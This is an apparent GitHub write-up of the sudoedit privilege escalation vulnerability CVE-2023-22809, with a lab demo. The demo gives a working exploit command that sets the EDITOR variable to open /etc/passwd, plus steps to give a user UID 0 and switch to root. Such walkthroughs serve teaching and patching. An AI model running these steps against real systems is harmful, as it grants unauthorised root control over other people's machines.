## [CVE-2023-22809: Sudoedit Privilege Escalation Vulnerability](https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf)

**Discovered by:** [Matthieu Barjole](https://fr.linkedin.com/in/matthieu-barjole-bb8790309) and [Victor Cutillas](https://www.linkedin.com/in/victor-c-security/) (from [Synacktiv](https://www.synacktiv.com/en))

**Affected Versions:** Sudo ```1.8.0``` - ```1.9.12p1```

**Component:** ```sudoedit``` function in Unix systems
<br>
<br>

## Vulnerability Overview
* Permits escalation of privileges by overcoming the ```sudoers``` configuration.
* Can be exploited by anyone granted ```sudoedit``` rights.
* Enables modification of files that the policy would otherwise block.
<br>

## Exploitation Details
* Triggered when the user-specified editor includes a ```--``` argument.
* The ```--``` causes the sudo front-end to treat all following inputs as file paths.
* This bypasses normal checks and restrictions defined in the sudoers configuration.
<br>

## Impact
* Malicious users can gain unauthorized access to sensitive files.
* Potential for root-level privilege escalation.
<br>

## Demo

On our Ubuntu machine, verify the ```sudo``` version using this command:
```
sudo -V
```
<br>
<img width="413" height="145" alt="image" src="https://github.com/user-attachments/assets/3f8c9e06-1bcd-4bc9-895c-994c43377407" />
<br>

We can see on the image above that the sudo version is ```1.9.9``` which is within the ```CVE-2023-22809```.
<br>

If we type ```sudo -l```, we can see the commands that we have access to. Based on the image below, we can see that we have access full access to ```sudoedit```.
<br>
<img width="1417" height="109" alt="image" src="https://github.com/user-attachments/assets/dfc246b7-a80b-4183-ba14-5a33e73acd14" />
<br>

Next, edit a privileged file (```/etc/passwd```) to escalate the compromised compromised user to root with the below command. Then copy root line entry(```/etc/passwd```) to paste and modify compromised user's line entry still on the same file.
```
EDITOR='nano -- /etc/passwd' sudoedit /etc/motd
```
<br>

At the very bottom, replace the last line with the following:
```
<USERNAME>:x:0:0:root:/root:/bin/bash
```
<br>

To verify, we can use the ```tail``` command:
```
tail -1 /etc/passwd
```
<br>
<img width="402" height="65" alt="image" src="https://github.com/user-attachments/assets/636d9ea3-fbd0-4aaf-b5ce-cd176006a3ea" />
<br>

Now, let's try and see if we've successfully escalated the compromised user to ```root``` by using below command(Enter password if prompted).
```
su <USERNAME>
```
<br>
<img width="431" height="136" alt="image" src="https://github.com/user-attachments/assets/6c19aaa9-a5a8-4356-bf7d-da7bcaf7fdc6" />
<br>

